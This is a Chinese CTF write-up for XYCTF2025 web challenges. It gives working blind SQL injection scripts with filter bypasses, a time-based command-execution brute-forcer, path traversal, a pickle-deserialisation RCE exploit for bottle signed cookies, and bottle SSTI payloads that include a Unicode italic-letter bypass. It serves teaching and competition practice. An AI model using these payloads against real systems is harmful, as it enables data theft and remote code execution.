---
title: XYCTF2025复现
date: 2025-08-12 15:59:23
tags:
- 布尔盲注
- 百分号09绕过空格过滤
- 逗号过滤绕过
- bottle框架
- pickle反序列化
- 斜体字绕过
category:
- 比赛复现
---

# XYCTF2025复现

## WEB

### ezsql(手动滑稽)

打开就是一个登录界面

尝试了一下注入发现username传参可以注入，password我们输入都会被转义前面会被添加反引号，而且这里username存在空格过滤，我们可以使用tab即%09来绕过空格过滤

```
username='%09or%091=1%09#&password=1
```

发现跳转到了doublecheck.php，试了一下也没有注入，还要我们输入密钥，我们可以在login.php界面进行布尔盲注，注意到逗号也被过滤了，

```
使用substr(xxx from x for y)代替substr(xxx,x,y)
```

python脚本

```
import requests as r


url = 'http://eci-2ze3h973qy7uqodho0gc.cloudeci1.ichunqiu.com/login.php'

value = ''
i = 1

while True:
    low, high = 0, 127
    char_ascii = 0
    
    while low <= high:
        mid = (low + high) // 2

        # payload = f"' OR ascii(substr(database() from {i} for {i})) > {mid}#"   # testdb
        # payload = f"' OR ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema='testdb') from {i} for {i})) > {mid}#" # double_check,user
        # payload = f"' OR ascii(substr((select group_concat(column_name) from information_schema.columns where table_name='double_check') from {i} for {i})) > {mid}#" # secret
        # payload = f"' OR ascii(substr((select group_concat(secret) from double_check) from {i} for {i})) > {mid}#" # dtfrtkcc0czkoua9S
        # payload = f"' OR ascii(substr((select group_concat(column_name) from information_schema.columns where table_name='user') from {i} for {i})) > {mid}#" # username,password
        # payload = f"' OR ascii(substr((select group_concat(username) from user) from {i} for {i})) > {mid}#" # yudeyoushang
        payload = f"' OR ascii(substr((select group_concat(password) from user) from {i} for {i})) > {mid}#" # zhonghengyisheng

        data = {
            'username': payload.replace(" ", "\t"),
            'password': '1'
        }

        result = r.post(url, data=data, allow_redirects=False)

        oracle = not "帐号或密码错误" in result.text
        
        if oracle:
            low = mid + 1
        else:
            high = mid - 1
    
    if high < 0:
        break
    
    char_ascii = high + 1
    if char_ascii == 0:
        break
    
    value += chr(char_ascii)
    print(f"Current: {value}")
    i += 1

print(f"Final value: {value}")

```

把东西全都注出来，然后用拿到的账号密码还有secret登录

```
username = yudeyoushang
password = zhonghengyisheng
secret = dtfrtkcc0czkoua9S
```

---

登录成功发现是一个命令执行的页面，无回显。

![](C:/Users/Administrator/myBlog/source/image/XYCTF2025-ezsql(手动滑稽)-2.png)

测试了一下发现存在空格过滤，可以用${IFS}代替空格绕过，试一下

```
sleep${IFS}2
```

发现响应速度变慢了，说明可以执行命令。

将ls /执行后的输出结果写入到flag.txt中。

```
ls${IFS}/${IFS}>${IFS}flag.txt
```

访问就能看到flag.txt了

然后直接将其写入到flag.txt中

```
cp${IFS}/flag.txt${IFS}flag.txt
```

再次访问flag.txt，就拿到flag了

---

或者使用命令执行盲注脚本爆出flag

```
import requests
import time

# from urllib.parse import quote as urlen
headers = {"Cookie": "PHPSESSID=a6994f9023a9a18160be0b7741d991ad"}  # 需要根据具体值修改
char = "1234567890_.qwertyuiopasdfghjklzxcvbnmQAZWSXEDCRFVTGBYHNUJMIK{}OLP"
flag = ""
url = 'http://gz.imxbt.cn:20473/index.php'
for x in range(1, 10):
    flag += '---'
    for i in range(1, 30):
        for j in char:
            payload = "if        [        `cat        /fla*        |        awk        'NR=={}'        |        cut        -c{}`        =        {}        ];then        sleep        0.5;fi".format(x, i, j)  # 延迟根据实际⽹络情况修改
            data = {"command": payload}
            start_time = time.time()
            response = requests.post(url=url, headers=headers, data=data)
            end_time = time.time()
            if end_time - start_time > 0.5:
                flag += j
                print(flag)

```

---

### Signin

[参考wp](https://www.cnblogs.com/LAMENTXU/articles/18730353)

源码

```
# -*- encoding: utf-8 -*-
'''
@File    :   main.py
@Time    :   2025/03/28 22:20:49
@Author  :   LamentXU 
'''
'''
flag in /flag_{uuid4}
'''
from bottle import Bottle, request, response, redirect, static_file, run, route
with open('../../secret.txt', 'r') as f:
    secret = f.read()

app = Bottle()
@route('/')
def index():
    return '''HI'''
@route('/download')
def download():
    name = request.query.filename
    if '../../' in name or name.startswith('/') or name.startswith('../') or '\\' in name:
        response.status = 403
        return 'Forbidden'
    with open(name, 'rb') as f:
        data = f.read()
    return data

@route('/secret')
def secret_page():
    try:
        session = request.get_cookie("name", secret=secret)
        if not session or session["name"] == "guest":
            session = {"name": "guest"}
            response.set_cookie("name", session, secret=secret)
            return 'Forbidden!'
        if session["name"] == "admin":
            return 'The secret has been deleted!'
    except:
        return "Error!"
run(host='0.0.0.0', port=8080, debug=False)
```

#### **路径穿越**

可以看到存在download路由

```
def download():
    name = request.query.filename
    if '../../' in name or name.startswith('/') or name.startswith('../') or '\\' in name:
        response.status = 403
        return 'Forbidden'
    with open(name, 'rb') as f:
        data = f.read()
    return data

```

这里只禁止了两个连在一起的../../和开头的../直接用./绕过即可

payload：

```
/download?filename=./.././.././../secret.txt
```

读取到了secret.txt

```
Hell0_H@cker_Y0u_A3r_Sm@r7
```

#### pickle反序列化

可以看到有一个secret路由

```
def secret_page():
    try:
        session = request.get_cookie("name", secret=secret)
        if not session or session["name"] == "guest":
            session = {"name": "guest"}
            response.set_cookie("name", session, secret=secret)
            return 'Forbidden!'
        if session["name"] == "admin":
            return 'The secret has been deleted!'
    except:
        return "Error!"

```

get_cookie的逻辑：

```
    def get_cookie(self, key, default=None, secret=None, digestmod=hashlib.sha256):
        """ Return the content of a cookie. To read a `Signed Cookie`, the
            `secret` must match the one used to create the cookie (see
            :meth:`BaseResponse.set_cookie`). If anything goes wrong (missing
            cookie or wrong signature), return a default value. """
        value = self.cookies.get(key)
        if secret:
            # See BaseResponse.set_cookie for details on signed cookies.
            if value and value.startswith('!') and '?' in value:
                sig, msg = map(tob, value[1:].split('?', 1))
                hash = hmac.new(tob(secret), msg, digestmod=digestmod).digest()
                if _lscmp(sig, base64.b64encode(hash)):
                    dst = pickle.loads(base64.b64decode(msg))
                    if dst and dst[0] == key:
                        return dst[1]
            return default
        return value or default
```

可以看到只要签名对得上就能直接进入pickle的反序列化

使用bottle的`cookie_encode`生成payload之后拿着payload去改session的值，并将请求发送到/secret。随后可以把回显外带

exp：

```
import os  
import requests  
from bottle import cookie_encode  
import warnings  

# 忽略特定警告  
warnings.filterwarnings("ignore", category=DeprecationWarning)  

# 自定义 secret  
secret = "Hell0_H@cker_Y0u_A3r_Sm@r7"  

class Test:  
    def __reduce__(self):  
        return (eval, ("""__import__('os').system('cp /f* ./2.txt')""",))  

# 使用 cookie_encode 编码  
exp = cookie_encode(  
    ('session', {"name": [Test()]}),  
    secret  
)  

# 发起 GET 请求并传递 cookie  
response = requests.get('http://gz.imxbt.cn:20785/secret', cookies={'name': exp.decode()})
```

访问2.txt直接拿到flag。

#### 知识点-pickle反序列化

[pickle反序列化原理](https://blog.csdn.net/qq_45392044/article/details/145811276?utm_medium=distribute.pc_relevant.none-task-blog-2~default~baidujs_baidulandingword~default-0-145811276-blog-44627959.235^v43^control&spm=1001.2101.3001.4242.1&utm_relevant_index=2)

---

### 出题人已疯

知识点：

```
bottle的ssti注入
```

源码：


```
# -*- encoding: utf-8 -*-
'''
@File    :   app.py
@Time    :   2025/03/29 15:52:17
@Author  :   LamentXU 
'''
import bottle
'''
flag in /flag
'''
@bottle.route('/')
def index():
    return 'Hello, World!'
@bottle.route('/attack')
def attack():
    payload = bottle.request.query.get('payload')
    if payload and len(payload) < 25 and 'open' not in payload and '\\' not in payload:
        return bottle.template('hello '+payload)
    else:
        bottle.abort(400, 'Invalid payload')
if __name__ == '__main__':
    bottle.run(host='0.0.0.0', port=5000)
```

我们在attack路由里输入?payload={{2*2}}

检验到了有ssti漏洞

#### bottle的ssti和jinja2的区别:

```
Bottle:
使用简单的{{python表达式}}语法
例如：{{1+1}} 或 {{__import__('os').system('id')}}

Jinja2:
使用更复杂的模板语法
例如：{{ config.items() }} 或 {{ ''.__class__.__mro__[1].__subclasses__() }}
```

简述：**bottle的SSTI可以直接访问到内部类**

一般payload:

```
__import__('os').system('命令')
```

#### 绕过

直接用bottle的ssti利用脚本：

官方exp：

```
import requests

url = 'http://gz.imxbt.cn:20256/attack'


payload = "__import__('os').system('cat /f*>123')"


p = [payload[i:i+3] for i in range(0,len(payload),3)]
flag = True
for i in p:
    if flag:
        tmp = f'\n%import os;os.a="{i}"'
        flag = False
    else:
        tmp = f'\n%import os;os.a+="{i}"'
    r = requests.get(url,params={"payload":tmp})

r = requests.get(url,params={"payload":"\n%import os;eval(os.a)"})
r = requests.get(url,params={"payload":"\n%include('123')"}).text
print(r)
```

输出：

//hello 
flag{L@men7XU_d0es_n0t_w@nt_t0_g0_t0_scho01}

分析：

```
p = [payload[i:i+3] for i in range(0, len(payload), 3)]
//分块传输Payload（规避过滤）
将Payload 每3个字符分割，例如："__i", "mpo", "rt_", ...
目的是 绕过可能的长度限制或关键字过滤（如__import__可能被拦截）。
```

```
flag = True
for i in p:
    if flag:
        tmp = f'\n%import os;os.a="{i}"'  # 初始化 os.a
        flag = False
    else:
        tmp = f'\n%import os;os.a+="{i}"'  # 追加到 os.a
    r = requests.get(url, params={"payload": tmp})
    
//逐块发送Payload
\n% 是 Bottle模板的语法，类似于Jinja2的{{ }}，但Bottle允许直接执行Python代码。
import os;os.a="..."：第一次请求：初始化 os.a 为第一个分块（如"__i"）。
后续请求：用 += 拼接剩余分块（如"mpo"、"rt_"...）。
最终，os.a 会存储完整的Payload："__import__('os').system('cat /f*>123')"。
```

即如果服务器 **保持会话状态**（如`os.a`变量未被清除），可以尝试：

**分多次提交短Payload**，存储到某个变量：

- `{{a="__imp"}}`
- `{{a+="ort__"}}`
- `{{a+="('os')"}}`
- `{{eval(a)}}`（最终执行`__import__('os')`）

#### 知识点-bottle框架中的斜体字绕过

[聊聊bottle框架中由斜体字引发的模板注入（SSTI）waf bypass - LamentXU - 博客园](https://www.cnblogs.com/LAMENTXU/articles/18805019)

---

### 出题人又疯

源码

```
# -*- encoding: utf-8 -*-
'''
@File    :   app.py
@Time    :   2025/03/29 15:52:17
@Author  :   LamentXU 
'''
import bottle
'''
flag in /flag
'''
@bottle.route('/')
def index():
    return 'Hello, World!'
blacklist = [
    'o', '\\', '\r', '\n', 'os', 'import', 'eval', 'exec', 'system', ' ', ';' 
]
@bottle.route('/attack')
def attack():
    payload = bottle.request.query.get('payload')
    if payload and len(payload) < 25 and all(c not in payload for c in blacklist):
        print(payload)
        return bottle.template('hello '+payload)
    else:
        bottle.abort(400, 'Invalid payload')
if __name__ == '__main__':
    bottle.run(host='0.0.0.0', port=5000)

```

过滤了更多的字符。没办法用之前的方法了。

但是可以用斜体字绕过

python中有如下特性：

![](C:\Users\Administrator\myBlog\source\image\XYCTF-出题人又疯-1.png)

可以用斜体文字绕过

payload：

```
𝓸pen('/flag').read()
```

报错了，本地调试一下，发现url传参的时候把斜体的𝓸解析成了两个字符。

如图

![](C:\Users\Administrator\myBlog\source\image\XYCTF-出题人又疯-2.png)

可以看到斜体的o被解析成了%C2%BA

其实这里是一个URL解码的小坑。一个%BA就足够了。我们删除%C2即可。

对字符a，同理。替换为%aa

最终payload：

```
/attack?payload={{%BApen(%27/flag%27).re%aad()}}
```

















